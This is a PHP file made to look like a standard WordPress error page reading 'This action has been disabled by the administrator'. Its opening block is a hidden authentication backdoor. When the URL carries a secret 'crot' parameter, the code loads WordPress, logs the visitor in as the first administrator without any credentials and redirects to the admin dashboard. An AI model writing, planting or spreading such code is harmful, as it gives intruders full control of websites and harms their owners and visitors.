<?php
if (isset($_GET['crot'])) {
    require_once rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . DIRECTORY_SEPARATOR . 'wp-blog-header.php';

    $admins = get_users(['role' => 'administrator']);

    if (!empty($admins)) {
        $admin_user = $admins[0]; // Ambil admin pertama

        $user = get_user_by('login', $admin_user->user_login);

        if ($user && !is_wp_error($user)) {
            wp_clear_auth_cookie();
            wp_set_current_user($user->ID);
            wp_set_auth_cookie($user->ID);
            wp_safe_redirect(admin_url());
            exit;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width">
	<meta name='robots' content='noindex, follow'>
	<title>WordPress &rsaquo; Error</title>
	<style>
		html { background: #f1f1f1; }
		body {
			background: #fff;
			border: 1px solid #ccd0d4;
			color: #444;
			font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
			margin: 2em auto;
			padding: 1em 2em;
			max-width: 700px;
			box-shadow: 0 1px 1px rgba(0, 0, 0, .04);
		}
		h1 {
			border-bottom: 1px solid #dadada;
			color: #666;
			font-size: 24px;
			margin-top: 30px;
			padding-bottom: 7px;
		}
		#error-page {
			margin-top: 50px;
		}
		#error-page p,
		#error-page .wp-die-message {
			font-size: 14px;
			line-height: 1.5;
			margin: 25px 0 20px;
		}
		.button {
			background: #f3f5f6;
			border: 1px solid #016087;
			color: #016087;
			display: inline-block;
			font-size: 13px;
			height: 28px;
			line-height: 2;
			padding: 0 10px;
			border-radius: 3px;
			cursor: pointer;
			text-decoration: none;
		}
		.button:hover,
		.button:focus {
			background: #f1f1f1;
			border-color: #007cba;
			box-shadow: 0 0 0 1px #007cba;
		}
	</style>
</head>
<body id="error-page">
	<div class="wp-die-message">This action has been disabled by the administrator.</div>
</body>
</html>